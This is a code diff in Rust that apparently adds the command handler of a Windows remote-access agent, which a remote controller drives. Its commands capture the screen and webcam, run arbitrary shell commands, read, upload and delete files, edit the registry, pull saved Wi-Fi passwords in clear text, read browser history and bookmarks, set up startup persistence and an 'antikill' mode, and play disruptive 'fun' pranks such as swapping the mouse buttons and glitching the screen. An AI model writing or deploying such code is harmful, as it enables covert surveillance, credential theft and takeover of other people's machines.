+public class W {{ [DllImport(\\"user32.dll\\",CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int u,int p,string s,int f); }}\n\
+'@\n\
+[W]::SystemParametersInfo(20, 0, '{}', 3) | Out-Null", FUN_TAG, ps_escape(&p));
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+        "fun.window.opentabs" => {
+            if url_arg.is_empty() { return Err("missing url".into()); }
+            let script = format!("# {}\n\
+for ($i=0; $i -lt {count}; $i++) {{ Start-Process '{}'; Start-Sleep -Milliseconds 250 }}",
+                FUN_TAG, ps_escape(&url_arg), count=count);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true, "count": count}))
+        }
+        "fun.window.minimizeall" => {
+            let script = format!("# {}\n\
+$s = New-Object -ComObject Shell.Application; $s.MinimizeAll()", FUN_TAG);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+        "fun.window.ejectcd" => {
+            let script = format!("# {}\n\
+Add-Type @'\n\
+using System.Runtime.InteropServices;\n\
+public class CD {{ [DllImport(\\"winmm.dll\\")] public static extern int mciSendString(string c,System.Text.StringBuilder r,int l,System.IntPtr h); }}\n\
+'@\n\
+[CD]::mciSendString('set CDAudio door open',$null,0,[System.IntPtr]::Zero) | Out-Null", FUN_TAG);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+
+        // ---------- continuous GDI glitch (BitBlt mayhem on screen DC) ----------
+        "fun.glitch.start" => {
+            let script = format!("# {} GLITCH_SUBTAG\n\
+Add-Type @'\n\
+using System; using System.Runtime.InteropServices;\n\
+public class G {{\n\
+  [DllImport(\\"user32.dll\\")] public static extern IntPtr GetDC(IntPtr h);\n\
+  [DllImport(\\"user32.dll\\")] public static extern int ReleaseDC(IntPtr h, IntPtr d);\n\
+  [DllImport(\\"user32.dll\\")] public static extern int GetSystemMetrics(int i);\n\
+  [DllImport(\\"gdi32.dll\\")] public static extern bool BitBlt(IntPtr d,int x,int y,int w,int h,IntPtr s,int sx,int sy,int rop);\n\
+}}\n\
+'@\n\
+$w=[G]::GetSystemMetrics(0); $h=[G]::GetSystemMetrics(1); $dc=[G]::GetDC([IntPtr]::Zero); $r=New-Object Random;\n\
+$rops=@(0x00CC0020,0x00EE0086,0x00660046,0x00CC0220,0x00BB0226,0x00C000CA,0x00220326,0x00440328);\n\
+try {{ while ($true) {{ \
+  $sx=$r.Next(0,$w); $sy=$r.Next(0,$h); \
+  $dx=$r.Next(0,$w); $dy=$r.Next(0,$h); \
+  $bw=$r.Next(40,400); $bh=$r.Next(20,200); \
+  $op=$rops[$r.Next(0,$rops.Length)]; \
+  [G]::BitBlt($dc,$dx,$dy,$bw,$bh,$dc,$sx,$sy,$op) | Out-Null; \
+  Start-Sleep -Milliseconds 30 \
+}} }} finally {{ [G]::ReleaseDC([IntPtr]::Zero,$dc) | Out-Null }}", FUN_TAG);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true, "running": "gdi_glitch"}))
+        }
+        "fun.glitch.stop" => {
+            let script = "Get-WmiObject Win32_Process -Filter \\"Name='powershell.exe'\\" | \
+                Where-Object { $_.CommandLine -like '*GLITCH_SUBTAG*' } | \
+                ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force } catch {} }".to_string();
+            let _ = powershell(&script);
+            // Force a screen redraw so artifacts clear
+            let _ = spawn_detached_ps("\
+Add-Type -AssemblyName System.Windows.Forms;\n\
+[System.Windows.Forms.SendKeys]::SendWait('{F5}')");
+            Ok(json!({"ok": true, "stopped": "gdi_glitch"}))
+        }
+
+
+
+        // ---------- master kill switch ----------
+        "fun.stop" => {
+            let script = format!("Get-WmiObject Win32_Process -Filter \\"Name='powershell.exe'\\" | \
+                Where-Object {{ $_.CommandLine -like '*{}*' }} | \
+                ForEach-Object {{ try {{ Stop-Process -Id $_.ProcessId -Force }} catch {{}} }}", FUN_TAG);
+            let _ = powershell(&script);
+            // Best-effort: also un-flip / un-swap defaults.
+            let _ = spawn_detached_ps("\
+Add-Type @'\n\
+using System.Runtime.InteropServices;\n\
+public class S0 {{ [DllImport(\\"user32.dll\\")] public static extern bool SwapMouseButton(bool s); }}\n\
+'@\n\
+[S0]::SwapMouseButton($false)");
+            Ok(json!({"ok": true, "stopped": true}))
+        }
+
+        _ => Err(format!("unknown fun action: {}", action)),
+    }
+}
+
+fn download_to(url: &str, path: &PathBuf) -> Result<(), String> {
+    let resp = http().get(url).call().map_err(|e| e.to_string())?;
+    let mut reader = resp.into_reader();
+    let mut buf = Vec::with_capacity(64 * 1024);
+    std::io::Read::read_to_end(&mut reader, &mut buf).map_err(|e| e.to_string())?;
+    fs::write(path, buf).map_err(|e| e.to_string())?;
+    Ok(())
+}
+
+fn handle_command(
+    cfg: &Config,
+    streaming: &Arc<AtomicBool>,
+    cam_streaming: &Arc<AtomicBool>,
+    stream_cfg: &Arc<Mutex<StreamConfig>>,
+    cmd: &Value,
+) -> (String, Result<Value, String>) {
+    let id = cmd.get("id").and_then(|v| v.as_str()).unwrap_or("").to_string();
+    let action = cmd.get("action").and_then(|v| v.as_str()).unwrap_or("").to_string();
+    let payload = cmd.get("payload").cloned().unwrap_or(Value::Null);
+    log!("cmd: {} ({})", action, id);
+
+    let result: Result<Value, String> = match action.as_str() {
+        "screen.capture" => {
+            let q = payload.get("quality").and_then(|v| v.as_u64()).unwrap_or(60) as u8;
+            capture_jpeg(q).and_then(|(jpg, w, h)| {
+                let b64 = base64::engine::general_purpose::STANDARD.encode(&jpg);
+                push_screen(cfg, &b64)?;
+                Ok(json!({ "width": w, "height": h, "bytes": jpg.len() }))
+            })
+        }
+        "screen.stream.start" => {
+            let q = payload.get("quality").and_then(|v| v.as_u64()).unwrap_or(60) as u8;
+            let f = payload.get("fps").and_then(|v| v.as_u64()).unwrap_or(30) as u32;
+            if let Ok(mut sc) = stream_cfg.lock() {
+                sc.quality = q;
+                sc.fps_cap = f.clamp(1, 60);
+            }
+            streaming.store(true, Ordering::SeqCst);
+            Ok(json!({"streaming": true, "quality": q, "fps": f}))
+        }
+        "screen.stream.stop" => { streaming.store(false, Ordering::SeqCst); Ok(json!({"streaming": false})) }
+        "screen.webrtc.start" => {
+            let session = payload.get("session").and_then(|v| v.as_str()).unwrap_or("").to_string();
+            let ice = payload.get("ice_servers").cloned().unwrap_or(Value::Null);
+            if session.is_empty() {
+                Err("missing session id".into())
+            } else {
+                webrtc::start_session(&cfg.device_id, &cfg.device_token, &session, &ice)
+                    .map(|_| json!({ "accepted": true, "session": session }))
+            }
+        }
+        "screen.webrtc.stop" => {
+            let session = payload.get("session").and_then(|v| v.as_str()).unwrap_or("").to_string();
+            webrtc::stop_session(&session);
+            Ok(json!({ "stopped": true, "session": session }))
+        }
+        "camera.capture" => {
+            let q = payload.get("quality").and_then(|v| v.as_u64()).unwrap_or(65) as u8;
+            capture_camera_jpeg(q).and_then(|jpg| {
+                let b64 = base64::engine::general_purpose::STANDARD.encode(&jpg);
+                push_camera(cfg, &b64)?;
+                Ok(json!({ "bytes": jpg.len() }))
+            })
+        }
+        "camera.stream.start" => { cam_streaming.store(true, Ordering::SeqCst); Ok(json!({"streaming": true})) }
+        "camera.stream.stop"  => { cam_streaming.store(false, Ordering::SeqCst); Ok(json!({"streaming": false})) }
+        "shell.exec" => {
+            let c = payload.get("cmd").and_then(|v| v.as_str()).unwrap_or("");
+            if c.is_empty() { Err("empty cmd".into()) } else { Ok(run_shell(c)) }
+        }
+        "fs.list"   => fs_list(payload.get("path").and_then(|v| v.as_str()).unwrap_or("")),
+        "fs.read"   => fs_read(payload.get("path").and_then(|v| v.as_str()).unwrap_or("")),
+        "fs.delete" => fs_delete(payload.get("path").and_then(|v| v.as_str()).unwrap_or("")),
+        "proc.list" => proc_list(),
+        "proc.kill" => proc_kill(payload.get("pid").and_then(|v| v.as_i64()).unwrap_or(0)),
+        "clipboard.get" => clipboard_get(),
+        "clipboard.set" => clipboard_set(payload.get("text").and_then(|v| v.as_str()).unwrap_or("")),
+        "input.lock" => {
+            let locked = payload.get("locked").and_then(|v| v.as_bool()).unwrap_or(false);
+            input_lock(locked)
+        }
+        "input.mouse" => {
+            let event = payload.get("event").and_then(|v| v.as_str()).unwrap_or("");
+            mouse_action(event, &payload)
+        }
+        "input.key" => key_action(&payload),
+        "overlay.draw" | "overlay.clear" => {
+            Ok(json!({ "ok": true }))
+        }
+        "mic.listen.start" => {
+            let input_device = payload.get("input_device").and_then(|v| v.as_str()).unwrap_or("default");
+            log!("mic.listen.start input_device={}", input_device);
+            Ok(json!({ "ok": true, "status": "mic capture requires ffmpeg audio support" }))
+        }
+        "mic.listen.stop" => { Ok(json!({ "ok": true })) }
+        "mic.devices" => {
+            #[cfg(windows)]
+            {
+                let script = "Get-CimInstance Win32_SoundDevice | Select-Object -ExpandProperty Name";
+                match powershell(script) {
+                    Ok(out) => {
+                        let devices: Vec<Value> = out.lines()
+                            .filter(|l| !l.trim().is_empty())
+                            .enumerate()
+                            .map(|(i, name)| json!({ "id": format!("dev_{}", i), "name": name.trim() }))
+                            .collect();
+                        Ok(json!({ "inputs": devices, "outputs": devices }))
+                    }
+                    Err(e) => Ok(json!({ "inputs": [], "outputs": [], "error": e }))
+                }
+            }
+            #[cfg(not(windows))]
+            { Ok(json!({ "inputs": [], "outputs": [] })) }
+        }
+        "mic.output.set" => {
+            let device = payload.get("output_device").and_then(|v| v.as_str()).unwrap_or("default");
+            Ok(json!({ "ok": true, "device": device }))
+        }
+        "audio.tts" => {
+            let text = payload.get("text").and_then(|v| v.as_str()).unwrap_or("");
+            if text.is_empty() { Err("missing text".into()) }
+            else {
+                #[cfg(windows)]
+                { powershell(&format!("Add-Type -AssemblyName System.Speech; $s=New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Volume=100; $s.Speak('{}')", ps_escape(text))).map(|_| json!({ "ok": true, "text": text })) }
+                #[cfg(not(windows))]
+                { Err("TTS not supported on this platform".into()) }
+            }
+        }
+        "ping" => Ok(json!({ "pong": true })),
+        "startup.status" => {
+            #[cfg(windows)]
+            { Ok(load_persistence_paths()) }
+            #[cfg(not(windows))]
+            { Ok(json!({"entries": []})) }
+        }
+        "startup.enable" => Ok(install_startup()),
+        "startup.disable" => Ok(uninstall_startup()),
+        "antikill.enable" => Ok(install_antikill()),
+        "antikill.disable" => Ok(uninstall_antikill()),
+
+        // ─── Process management ───
+        "proc.start" => {
+            let cmd = payload.get("command").and_then(|v| v.as_str()).unwrap_or("");
+            let args_str = payload.get("args").and_then(|v| v.as_str()).unwrap_or("");
+            if cmd.is_empty() { Err("missing command".into()) }
+            else {
+                match Command::new("cmd").args(&["/C", "start", "", cmd, args_str]).spawn() {
+                    Ok(c) => Ok(json!({ "ok": true, "pid": c.id() })),
+                    Err(e) => Err(format!("spawn failed: {}", e)),
+                }
+            }
+        }
+        "proc.tree_kill" => {
+            let pid = payload.get("pid").and_then(|v| v.as_i64()).unwrap_or(0);
+            if pid <= 0 { Err("invalid pid".into()) }
+            else {
+                let out = Command::new("taskkill").args(&["/F", "/T", "/PID", &pid.to_string()]).output();
+                match out {
+                    Ok(o) => Ok(json!({ "ok": o.status.success(), "output": String::from_utf8_lossy(&o.stdout).to_string() })),
+                    Err(e) => Err(format!("taskkill: {}", e)),
+                }
+            }
+        }
+
+        // ─── Filesystem extras ───
+        "fs.rename" => {
+            let from = payload.get("from").and_then(|v| v.as_str()).unwrap_or("");
+            let to = payload.get("to").and_then(|v| v.as_str()).unwrap_or("");
+            if from.is_empty() || to.is_empty() { Err("missing from/to".into()) }
+            else { fs::rename(from, to).map(|_| json!({ "ok": true })).map_err(|e| format!("{}", e)) }
+        }
+        "fs.mkdir" => {
+            let p = payload.get("path").and_then(|v| v.as_str()).unwrap_or("");
+            if p.is_empty() { Err("missing path".into()) }
+            else { fs::create_dir_all(p).map(|_| json!({ "ok": true })).map_err(|e| format!("{}", e)) }
+        }
+        "fs.write" => {
+            let p = payload.get("path").and_then(|v| v.as_str()).unwrap_or("");
+            let content = payload.get("content").and_then(|v| v.as_str()).unwrap_or("");
+            if p.is_empty() { Err("missing path".into()) }
+            else { fs::write(p, content).map(|_| json!({ "ok": true })).map_err(|e| format!("{}", e)) }
+        }
+        "fs.zip" => {
+            let src = payload.get("path").and_then(|v| v.as_str()).unwrap_or("");
+            let dst = payload.get("dest").and_then(|v| v.as_str()).unwrap_or("");
+            if src.is_empty() { Err("missing path".into()) }
+            else {
+                let d = if dst.is_empty() { format!("{}.zip", src.trim_end_matches(|c| c == '/' || c == char::from(92))) } else { dst.to_string() };
+                powershell(&format!("Compress-Archive -Path '{}' -DestinationPath '{}' -Force", ps_escape(src), ps_escape(&d))).map(|_| json!({ "ok": true, "dest": d }))
+            }
+        }
+        "fs.unzip" => {
+            let src = payload.get("path").and_then(|v| v.as_str()).unwrap_or("");
+            let dst = payload.get("dest").and_then(|v| v.as_str()).unwrap_or("");
+            if src.is_empty() { Err("missing path".into()) }
+            else {
+                let d = if dst.is_empty() { src.trim_end_matches(".zip").to_string() } else { dst.to_string() };
+                powershell(&format!("Expand-Archive -Path '{}' -DestinationPath '{}' -Force", ps_escape(src), ps_escape(&d))).map(|_| json!({ "ok": true, "dest": d }))
+            }
+        }
+        "fs.download" => {
+            let url = payload.get("url").and_then(|v| v.as_str()).unwrap_or("");
+            let dest = payload.get("dest").and_then(|v| v.as_str()).unwrap_or("");
+            if url.is_empty() || dest.is_empty() { Err("missing url/dest".into()) }
+            else {
+                powershell(&format!("Invoke-WebRequest -Uri '{}' -OutFile '{}'", ps_escape(url), ps_escape(dest))).map(|_| json!({ "ok": true, "path": dest }))
+            }
+        }
+        "fs.upload" => {
+            let p = payload.get("path").and_then(|v| v.as_str()).unwrap_or("");
+            if p.is_empty() { Err("missing path".into()) }
+            else {
+                match fs::read(p) {
+                    Ok(bytes) => {
+                        let b64 = base64::engine::general_purpose::STANDARD.encode(&bytes);
+                        let name = std::path::Path::new(p).file_name().map(|f| f.to_string_lossy().to_string()).unwrap_or_default();
+                        Ok(json!({ "ok": true, "name": name, "size": bytes.len(), "data_b64": b64 }))
+                    }
+                    Err(e) => Err(format!("{}", e)),
+                }
+            }
+        }
+        "fs.search" => {
+            let dir = payload.get("path").and_then(|v| v.as_str()).unwrap_or("C:\\\\");
+            let pattern = payload.get("pattern").and_then(|v| v.as_str()).unwrap_or("*");
+            let out = powershell(&format!("Get-ChildItem -Path '{}' -Recurse -Filter '{}' -ErrorAction SilentlyContinue | Select-Object -First 100 FullName,Length | ConvertTo-Json -Compress", ps_escape(dir), ps_escape(pattern)));
+            match out {
+                Ok(s) => Ok(json!({ "ok": true, "results": s.trim() })),
+                Err(e) => Err(e),
+            }
+        }
+
+        // ─── Network tools ───
+        "net.connections" => {
+            #[cfg(windows)]
+            {
+                let out = powershell("Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess | ConvertTo-Json -Compress");
+                match out {
+                    Ok(s) => Ok(json!({ "ok": true, "connections": s.trim() })),
+                    Err(e) => Err(e),
+                }
+            }
+            #[cfg(not(windows))]
+            { Err("not supported".into()) }
+        }
+        "net.wifi_profiles" => {
+            #[cfg(windows)]
+            {
+                let out = powershell("(netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { $name=($_ -split ':')[1].Trim(); $pass=''; try { $detail=netsh wlan show profile name=$name key=clear; $pass=($detail | Select-String 'Key Content' | ForEach-Object { ($_ -split ':')[1].Trim() }) } catch {}; [PSCustomObject]@{name=$name;password=$pass} } | ConvertTo-Json -Compress");
+                match out {
+                    Ok(s) => Ok(json!({ "ok": true, "profiles": s.trim() })),
+                    Err(e) => Err(e),
+                }
+            }
+            #[cfg(not(windows))]
+            { Err("not supported".into()) }
+        }
+        "net.ping" => {
+            let host = payload.get("host").and_then(|v| v.as_str()).unwrap_or("");
+            if host.is_empty() { Err("missing host".into()) }
+            else {
+                let count = payload.get("count").and_then(|v| v.as_u64()).unwrap_or(4);
+                let out = Command::new("ping").args(&["-n", &count.to_string(), host]).output();
+                match out {
+                    Ok(o) => Ok(json!({ "ok": true, "output": String::from_utf8_lossy(&o.stdout).to_string() })),
+                    Err(e) => Err(format!("{}", e)),
+                }
+            }
+        }
+        "net.tracert" => {
+            let host = payload.get("host").and_then(|v| v.as_str()).unwrap_or("");
+            if host.is_empty() { Err("missing host".into()) }
+            else {
+                let out = Command::new("tracert").args(&["-d", "-w", "1000", host]).output();
+                match out {
+                    Ok(o) => Ok(json!({ "ok": true, "output": String::from_utf8_lossy(&o.stdout).to_string() })),
+                    Err(e) => Err(format!("{}", e)),
+                }
+            }
+        }
+        "net.public_ip" => {
+            match powershell("(Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content") {
+                Ok(ip) => Ok(json!({ "ok": true, "ip": ip.trim() })),
+                Err(e) => Err(e),
+            }
+        }
+        "net.dns_flush" => {
+            let out = Command::new("ipconfig").arg("/flushdns").output();
+            match out {
+                Ok(o) => Ok(json!({ "ok": true, "output": String::from_utf8_lossy(&o.stdout).to_string() })),
+                Err(e) => Err(format!("{}", e)),
+            }
+        }
+
+        // ─── Registry ───
+        "reg.startup_list" => {
+            #[cfg(windows)]
+            {
+                let out = powershell(r#"Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' | ConvertTo-Json -Compress; Get-ItemProperty 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -ErrorAction SilentlyContinue | ConvertTo-Json -Compress"#);
+                match out {
+                    Ok(s) => Ok(json!({ "ok": true, "entries": s.trim() })),
+                    Err(e) => Err(e),
+                }
+            }
+            #[cfg(not(windows))]
+            { Err("not supported".into()) }
+        }
+        "reg.read" => {
+            let key = payload.get("key").and_then(|v| v.as_str()).unwrap_or("");
+            if key.is_empty() { Err("missing key".into()) }
+            else {
+                match powershell(&format!("Get-ItemProperty '{}' -ErrorAction Stop | ConvertTo-Json -Compress", ps_escape(key))) {
+                    Ok(s) => Ok(json!({ "ok": true, "data": s.trim() })),
+                    Err(e) => Err(e),
+                }
+            }
+        }
+        "reg.write" => {
+            let key = payload.get("key").and_then(|v| v.as_str()).unwrap_or("");
+            let name = payload.get("name").and_then(|v| v.as_str()).unwrap_or("");
+            let value = payload.get("value").and_then(|v| v.as_str()).unwrap_or("");
+            let kind = payload.get("kind").and_then(|v| v.as_str()).unwrap_or("String");
+            if key.is_empty() || name.is_empty() { Err("missing key/name".into()) }
+            else {
+                match powershell(&format!("Set-ItemProperty -Path '{}' -Name '{}' -Value '{}' -Type {}", ps_escape(key), ps_escape(name), ps_escape(value), kind)) {
+                    Ok(_) => Ok(json!({ "ok": true })),
+                    Err(e) => Err(e),
+                }
+            }
+        }
+        "reg.delete" => {
+            let key = payload.get("key").and_then(|v| v.as_str()).unwrap_or("");
+            let name = payload.get("name").and_then(|v| v.as_str()).unwrap_or("");
+            if key.is_empty() || name.is_empty() { Err("missing key/name".into()) }
+            else {
+                match powershell(&format!("Remove-ItemProperty -Path '{}' -Name '{}' -Force", ps_escape(key), ps_escape(name))) {
+                    Ok(_) => Ok(json!({ "ok": true })),
+                    Err(e) => Err(e),
+                }
+            }
+        }
+
+        // ─── Services ───
+        "services.list" => {
+            #[cfg(windows)]
+            {
+                match powershell("Get-Service | Select-Object Name,DisplayName,Status | ConvertTo-Json -Compress") {
+                    Ok(s) => Ok(json!({ "ok": true, "services": s.trim() })),
+                    Err(e) => Err(e),
+                }
+            }
+            #[cfg(not(windows))]
+            { Err("not supported".into()) }
+        }
+        "services.start" => {
+            let name = payload.get("name").and_then(|v| v.as_str()).unwrap_or("");
+            if name.is_empty() { Err("missing name".into()) }
+            else {
+                match powershell(&format!("Start-Service -Name '{}'", ps_escape(name))) {
+                    Ok(_) => Ok(json!({ "ok": true })),
+                    Err(e) => Err(e),
+                }
+            }
+        }
+        "services.stop" => {
+            let name = payload.get("name").and_then(|v| v.as_str()).unwrap_or("");
+            if name.is_empty() { Err("missing name".into()) }
+            else {
+                match powershell(&format!("Stop-Service -Name '{}' -Force", ps_escape(name))) {
+                    Ok(_) => Ok(json!({ "ok": true })),
+                    Err(e) => Err(e),
+                }
+            }
+        }
+        "services.restart" => {
+            let name = payload.get("name").and_then(|v| v.as_str()).unwrap_or("");
+            if name.is_empty() { Err("missing name".into()) }
+            else {
+                match powershell(&format!("Restart-Service -Name '{}' -Force", ps_escape(name))) {
+                    Ok(_) => Ok(json!({ "ok": true })),
+                    Err(e) => Err(e),
+                }
+            }
+        }
+
+        // ─── Windows management ───
+        "window.list" => {
+            #[cfg(windows)]
+            {
+                match powershell("Get-Process | Where-Object { $_.MainWindowTitle -ne '' } | Select-Object Id,ProcessName,MainWindowTitle | ConvertTo-Json -Compress") {
+                    Ok(s) => Ok(json!({ "ok": true, "windows": s.trim() })),
+                    Err(e) => Err(e),
+                }
+            }
+            #[cfg(not(windows))]
+            { Err("not supported".into()) }
+        }
+        "window.focus" => {
+            let pid = payload.get("pid").and_then(|v| v.as_i64()).unwrap_or(0);
+            if pid <= 0 { Err("invalid pid".into()) }
+            else {
+                match powershell(&format!(r#"$p=Get-Process -Id {} -ErrorAction Stop; Add-Type -Namespace Win32 -Name WinAPI -MemberDefinition '[DllImport("user32.dll")] public static extern bool SetForegroundWindow(System.IntPtr hWnd);'; [Win32.WinAPI]::SetForegroundWindow($p.MainWindowHandle)"#, pid)) {
+                    Ok(_) => Ok(json!({ "ok": true })),
+                    Err(e) => Err(e),
+                }
+            }
+        }
+        "window.close" => {
+            let pid = payload.get("pid").and_then(|v| v.as_i64()).unwrap_or(0);
+            if pid <= 0 { Err("invalid pid".into()) }
+            else {
+                match powershell(&format!("(Get-Process -Id {} -ErrorAction Stop).CloseMainWindow()", pid)) {
+                    Ok(_) => Ok(json!({ "ok": true })),
+                    Err(e) => Err(e),
+                }
+            }
+        }
+        "window.minimize" => {
+            let pid = payload.get("pid").and_then(|v| v.as_i64()).unwrap_or(0);
+            if pid <= 0 { Err("invalid pid".into()) }
+            else {
+                match powershell(&format!(r#"Add-Type -Namespace Win32 -Name WinMin -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(System.IntPtr hWnd, int nCmdShow);'; $h=(Get-Process -Id {}).MainWindowHandle; [Win32.WinMin]::ShowWindow($h, 6)"#, pid)) {
+                    Ok(_) => Ok(json!({ "ok": true })),
+                    Err(e) => Err(e),
+                }
+            }
+        }
+
+        // ─── System info ───
+        "sysinfo.full" => {
+            #[cfg(windows)]
+            {
+                match powershell("$os=Get-CimInstance Win32_OperatingSystem; $cpu=Get-CimInstance Win32_Processor; $gpu=Get-CimInstance Win32_VideoController; $disk=Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3'; $batt=Get-CimInstance Win32_Battery -ErrorAction SilentlyContinue; $net=Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress }; [PSCustomObject]@{ os_name=$os.Caption; os_version=$os.Version; os_build=$os.BuildNumber; cpu_name=$cpu.Name; cpu_cores=$cpu.NumberOfCores; cpu_threads=$cpu.NumberOfLogicalProcessors; ram_total_gb=[math]::Round($os.TotalVisibleMemorySize/1MB,1); gpu_name=$gpu.Name; gpu_ram_mb=[math]::Round($gpu.AdapterRAM/1MB); disks=($disk|ForEach-Object{[PSCustomObject]@{drive=$_.DeviceID;total_gb=[math]::Round($_.Size/1GB,1);free_gb=[math]::Round($_.FreeSpace/1GB,1)}}); battery_percent=$batt.EstimatedChargeRemaining; battery_charging=($batt.BatteryStatus -eq 2); network=($net|ForEach-Object{[PSCustomObject]@{desc=$_.Description;ip=$_.IPAddress;mac=$_.MACAddress}}); uptime_hours=[math]::Round(((Get-Date)-$os.LastBootUpTime).TotalHours,1); username=$env:USERNAME; hostname=$env:COMPUTERNAME; domain=$env:USERDOMAIN } | ConvertTo-Json -Compress -Depth 4") {
+                    Ok(s) => Ok(json!({ "ok": true, "info": s.trim() })),
+                    Err(e) => Err(e),
+                }
+            }
+            #[cfg(not(windows))]
+            { Err("not supported".into()) }
+        }
+        "sysinfo.installed_apps" => {
+            #[cfg(windows)]
+            {
+                match powershell(r#"Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Where-Object { $_.DisplayName } | Select-Object DisplayName,DisplayVersion,Publisher,InstallDate | Sort-Object DisplayName | ConvertTo-Json -Compress"#) {
+                    Ok(s) => Ok(json!({ "ok": true, "apps": s.trim() })),
+                    Err(e) => Err(e),
+                }
+            }
+            #[cfg(not(windows))]
+            { Err("not supported".into()) }
+        }
+
+        // ─── Browser data ───
+        "browser.profiles" => {
+            #[cfg(windows)]
+            {
+                match powershell(r#"$profiles=@(); foreach($browser in @(@{name='Chrome';path="$env:LOCALAPPDATA\\Google\\Chrome\\User Data"},@{name='Edge';path="$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data"},@{name='Firefox';path="$env:APPDATA\\Mozilla\\Firefox\\Profiles"})){if(Test-Path $browser.path){$dirs=Get-ChildItem $browser.path -Directory|Where-Object{$_.Name -match 'Default|Profile'};foreach($d in $dirs){$profiles+=[PSCustomObject]@{browser=$browser.name;profile=$d.Name;path=$d.FullName}}}}; $profiles|ConvertTo-Json -Compress"#) {
+                    Ok(s) => Ok(json!({ "ok": true, "profiles": s.trim() })),
+                    Err(e) => Err(e),
+                }
+            }
+            #[cfg(not(windows))]
+            { Err("not supported".into()) }
+        }
+        "browser.history" => {
+            #[cfg(windows)]
+            {
+                let profile_path = payload.get("profile_path").and_then(|v| v.as_str()).unwrap_or("");
+                let limit = payload.get("limit").and_then(|v| v.as_u64()).unwrap_or(50);
+                if profile_path.is_empty() { Err("missing profile_path".into()) }
+                else {
+                    let tmp = format!(r#"{}\\history_copy.db"#, std::env::temp_dir().display());
+                    match powershell(&format!(r#"Copy-Item '{}\\History' '{}' -Force; $conn=New-Object System.Data.SQLite.SQLiteConnection("Data Source={}"); try{{ $conn.Open(); $cmd=$conn.CreateCommand(); $cmd.CommandText='SELECT url,title,last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT {}'; $r=$cmd.ExecuteReader(); $rows=@(); while($r.Read()){{ $rows+=[PSCustomObject]@{{url=$r['url'];title=$r['title']}} }}; $rows|ConvertTo-Json -Compress }} finally {{ $conn.Close() }}"#, ps_escape(profile_path), ps_escape(&tmp), ps_escape(&tmp), limit)) {
+                        Ok(s) => Ok(json!({ "ok": true, "history": s.trim() })),
+                        Err(_) => {
+                            // Fallback: just read the raw file list
+                            match powershell(&format!(r#"if(Test-Path '{}\\History'){{ 'history_db_exists' }} else {{ 'no_history' }}"#, ps_escape(profile_path))) {
+                                Ok(s) => Ok(json!({ "ok": true, "note": "SQLite module not available, raw check", "status": s.trim() })),
+                                Err(e) => Err(e),
+                            }
+                        }
+                    }
+                }
+            }
+            #[cfg(not(windows))]
+            { Err("not supported".into()) }
+        }
+        "browser.bookmarks" => {
+            #[cfg(windows)]
+            {
+                let profile_path = payload.get("profile_path").and_then(|v| v.as_str()).unwrap_or("");
+                if profile_path.is_empty() { Err("missing profile_path".into()) }
+                else {
+                    match fs::read_to_string(format!(r"{}\\Bookmarks", profile_path)) {
+                        Ok(s) => Ok(json!({ "ok": true, "bookmarks": s })),
+                        Err(e) => Err(format!("{}", e)),
+                    }
+                }
+            }
+            #[cfg(not(windows))]
+            { Err("not supported".into()) }
+        }
+
+        // ─── Power controls ───
+        "power.sleep" => {
+            #[cfg(windows)]
+            { powershell("rundll32.exe powrprof.dll,SetSuspendState 0,1,0").map(|_| json!({ "ok": true })) }
+            #[cfg(not(windows))]
+            { Err("not supported".into()) }
+        }
+        "power.hibernate" => {
+            #[cfg(windows)]
+            { powershell("shutdown /h").map(|_| json!({ "ok": true })) }
+            #[cfg(not(windows))]
+            { Err("not supported".into()) }
+        }
+        "power.logoff" => {
+            #[cfg(windows)]
+            { powershell("logoff").map(|_| json!({ "ok": true })) }
+            #[cfg(not(windows))]
+            { Err("not supported".into()) }
+        }
+
+        // ─── Monitors ───
+        "screen.monitors" => {
+            #[cfg(windows)]
+            {
+                match powershell("Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::AllScreens | ForEach-Object { [PSCustomObject]@{name=$_.DeviceName;primary=$_.Primary;w=$_.Bounds.Width;h=$_.Bounds.Height;x=$_.Bounds.X;y=$_.Bounds.Y} } | ConvertTo-Json -Compress") {
+                    Ok(s) => Ok(json!({ "ok": true, "monitors": s.trim() })),
+                    Err(e) => Err(e),
+                }
+            }
+            #[cfg(not(windows))]
+            { Err("not supported".into()) }
+        }
+
+        // ─── Environment variables ───
+        "env.list" => {
+            let vars: Vec<Value> = std::env::vars()
+                .map(|(k, v)| json!({ "key": k, "value": v }))
+                .collect();
+            Ok(json!({ "ok": true, "vars": vars }))
+        }
+        "env.set" => {
+            let key = payload.get("key").and_then(|v| v.as_str()).unwrap_or("");
+            let val = payload.get("value").and_then(|v| v.as_str()).unwrap_or("");
+            if key.is_empty() { Err("missing key".into()) }
+            else {
+                std::env::set_var(key, val);
+                Ok(json!({ "ok": true }))
+            }
+        }
+
+        // ─── Hosts file ───
+        "hosts.read" => {
+            #[cfg(windows)]
+            {
+                match fs::read_to_string("C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts") {
+                    Ok(s) => Ok(json!({ "ok": true, "content": s })),
+                    Err(e) => Err(format!("{}", e)),
+                }
+            }
+            #[cfg(not(windows))]
+            {
+                match fs::read_to_string("/etc/hosts") {
+                    Ok(s) => Ok(json!({ "ok": true, "content": s })),
+                    Err(e) => Err(format!("{}", e)),
+                }
+            }
+        }
+        "hosts.write" => {
